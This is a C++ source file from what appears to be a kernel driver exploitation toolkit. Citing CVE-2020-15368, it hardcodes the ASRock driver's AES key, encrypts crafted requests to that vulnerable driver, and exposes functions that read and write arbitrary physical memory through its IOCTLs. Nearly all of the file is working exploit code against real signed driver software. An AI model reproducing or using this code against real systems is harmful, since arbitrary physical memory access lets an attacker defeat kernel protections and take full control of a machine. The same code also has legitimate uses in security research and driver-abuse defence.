/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       ASRDRV.CPP
*
*  VERSION:     1.43
*
*  DATE:        10 Nov 2023
*
*  ASRock driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/asrdrv.h"

//
// Based on CVE-2020-15368
//

#define ASROCK_AES_KEY          "C110DD4FE9434147B92A5A1E3FDBF29A"
#define ASROCK_AES_KEY_LENGTH   sizeof(ASROCK_AES_KEY) - sizeof(CHAR)

ULONG g_AsrReadPhysIOCTL;
ULONG g_AsrWritePhysIOCTL;

/*
* AsrEncryptDriverRequest
*
* Purpose:
*
* Encrypt ASRock driver request with AES.
*
*/
BOOL AsrEncryptDriverRequest(
    _In_ PUCHAR DriverRequest,
    _In_ ULONG RequestSize,
    _Inout_ PVOID* EncodedData,
    _Inout_ ULONG* EncodedSize
)
{
    BOOL bResult = FALSE;

    NTSTATUS status;

    ASRDRV_REQUEST request;
    ASRDRV_REQUEST_FOOTER* requestFooter;

    BCRYPT_ALG_HANDLE hAlgAes = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    HANDLE heapCNG = NULL;

    PBYTE pbCipherData = NULL;
    DWORD cbCipherData;
    DWORD cbResult = 0;

    BYTE encKey[32];

    RtlSecureZeroMemory(&request, sizeof(request));
    RtlSecureZeroMemory(&encKey, sizeof(encKey));
    request.SizeOfIv = sizeof(request.Iv);

    RtlFillMemory(request.Iv, sizeof(request.Iv), 69);
    RtlFillMemory(request.Key, sizeof(request.Key), 69);

    do {

        RtlCopyMemory(&encKey, ASROCK_AES_KEY, ASROCK_AES_KEY_LENGTH);
        RtlCopyMemory(&encKey[13], request.Key, sizeof(request.Key));

        heapCNG = HeapCreate(0, 0, 0);
        if (heapCNG == NULL)
            break;

        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlgAes,
            BCRYPT_AES_ALGORITHM,
            NULL,
            0)))
        {
            break;
        }

        if (!NT_SUCCESS(BCryptGenerateSymmetricKey(
            hAlgAes,
            &hKey,
            NULL,
            0,
            encKey,
            sizeof(encKey),
            0)))
        {
            break;
        }

        PUCHAR pbIv = (PUCHAR)HeapAlloc(heapCNG, HEAP_ZERO_MEMORY, request.SizeOfIv);
        if (pbIv) {

            RtlCopyMemory(pbIv, request.Iv, request.SizeOfIv);

            cbCipherData = RequestSize + 64;

            pbCipherData = (PBYTE)HeapAlloc(heapCNG, HEAP_ZERO_MEMORY, cbCipherData);
            if (pbCipherData) {

                status = BCryptEncrypt(hKey,
                    DriverRequest,
                    RequestSize,
                    NULL,
                    pbIv,
                    request.SizeOfIv,
                    pbCipherData,
                    cbCipherData,
                    &cbResult,
                    BCRYPT_BLOCK_PADDING);

                bResult = NT_SUCCESS(status);

            }

        }

    } while (FALSE);

    if (hKey != NULL)
        BCryptDestroyKey(hKey);

    if (hAlgAes != NULL)
        BCryptCloseAlgorithmProvider(hAlgAes, 0);

    if (bResult && cbResult && pbCipherData) {

        ULONG outSize = sizeof(ASRDRV_REQUEST) +
            cbResult +
            sizeof(ASRDRV_REQUEST_FOOTER);

        PBYTE result = (PBYTE)supHeapAlloc(outSize);

        if (result) {

            RtlCopyMemory(result, &request, sizeof(request));

            RtlCopyMemory(RtlOffsetToPointer(result, sizeof(ASRDRV_REQUEST)),
                pbCipherData,
                cbResult);

            requestFooter = (ASRDRV_REQUEST_FOOTER*)RtlOffsetToPointer(result,
                outSize - sizeof(ASRDRV_REQUEST_FOOTER));

            requestFooter->Size = cbResult;

            *EncodedData = result;
            *EncodedSize = outSize;
        }

    }

    if (heapCNG) HeapDestroy(heapCNG);

    return bResult;
}

/*
* AsrCallDriver
*
* Purpose:
*
* Call ASRock driver with encrypted context.
*
*/
BOOL AsrCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ ASRDRV_ARGS* Arguments
)
{
    ASRDRV_COMMAND command;
    PVOID pvEncryptedCommand = NULL;
    DWORD cbEncryptedCommand = 0;

    IO_STATUS_BLOCK ioStatus;

    BYTE outBuffer[PAGE_SIZE];

    RtlSecureZeroMemory(&command, sizeof(command));

    command.OperationCode = IoControlCode;
    RtlCopyMemory(&command.Arguments, Arguments, sizeof(ASRDRV_ARGS));

    if (!AsrEncryptDriverRequest((PUCHAR)&command,
        sizeof(command),
        &pvEncryptedCommand,
        &cbEncryptedCommand))
    {
        return FALSE;
    }

    RtlSecureZeroMemory(&outBuffer, sizeof(outBuffer));
    RtlSecureZeroMemory(&ioStatus, sizeof(ioStatus));

    NTSTATUS status = supCallDriverEx(DeviceHandle,
        IOCTL_ASRDRV_EXEC_DISPATCH,
        pvEncryptedCommand,
        cbEncryptedCommand,
        &outBuffer,
        sizeof(outBuffer),
        &ioStatus);

    return NT_SUCCESS(status);
}


/*
* AsrReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI AsrReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ASRDRV_ARGS args;

    RtlSecureZeroMemory(&args, sizeof(args));
    args.qwordArgs[0] = PhysicalAddress;
    args.dwordArgs[2] = NumberOfBytes;
    args.dwordArgs[3] = AsrGranularityDword;
    args.qwordArgs[2] = (DWORD64)Buffer;

    return AsrCallDriver(DeviceHandle,
        IOCTL_ASRDRV_READ_MEMORY,
        &args);
}

/*
* AsrWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI AsrWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ASRDRV_ARGS args;

    RtlSecureZeroMemory(&args, sizeof(args));
    args.qwordArgs[0] = PhysicalAddress;
    args.dwordArgs[2] = NumberOfBytes;
    args.dwordArgs[3] = AsrGranularityByte;
    args.qwordArgs[2] = (DWORD64)Buffer;

    return AsrCallDriver(DeviceHandle,
        IOCTL_ASRDRV_WRITE_MEMORY,
        &args);
}

/*
* RweReadPhysicalMemory
*
* Purpose:
*
* Read from the physical memory.
*
*/
BOOL WINAPI RweReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    ASR_RWE_REQUEST request;

    ULONG_PTR mapAddress = (PhysicalAddress & ~(PAGE_SIZE - 1));
    ULONG size = ALIGN_UP_BY(NumberOfBytes, PAGE_SIZE);
    PVOID data = (ASR_RWE_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (data) {

        RtlSecureZeroMemory(&request, sizeof(request));

        request.Address.QuadPart = mapAddress;
        request.Size = size;
        request.Data = (PBYTE)data;
        request.Granularity = AsrGranularityDword;

        if (supCallDriver(DeviceHandle,
            g_AsrReadPhysIOCTL,
            &request,
            sizeof(request),
            &request,
            sizeof(request)))
        {
            RtlCopyMemory(Buffer, RtlOffsetToPointer(data, PhysicalAddress - mapAddress), size);
            bResult = TRUE;
        }

        supFreeLockedMemory(data, size);
    }

    return bResult;
}

/*
* RweWritePhysicalMemory
*
* Purpose:
*
* Write to the physical memory.
*
*/
BOOL WINAPI RweWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ASR_RWE_REQUEST request;

    request.Address.QuadPart = PhysicalAddress;
    request.Size = NumberOfBytes;
    request.Granularity = AsrGranularityByte;
    request.Data = (PBYTE)Buffer;

    return supCallDriver(DeviceHandle,
        g_AsrWritePhysIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* AsrRegisterDriver
*
* Purpose:
*
* Register AsRock driver.
*
*/
BOOL WINAPI AsrRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);

    UNREFERENCED_PARAMETER(DeviceHandle);

    g_AsrReadPhysIOCTL = IOCTL_RWDRV_READ_MEMORY;
    g_AsrWritePhysIOCTL = IOCTL_RWDRV_WRITE_MEMORY;

    switch (DriverId) {

    case IDR_ASROCKDRV3:
        g_AsrReadPhysIOCTL = IOCTL_RWDRV_READ_MEMORY_7N;
        g_AsrWritePhysIOCTL = IOCTL_RWDRV_WRITE_MEMORY_7N;
        break;
    }

    return TRUE;
}
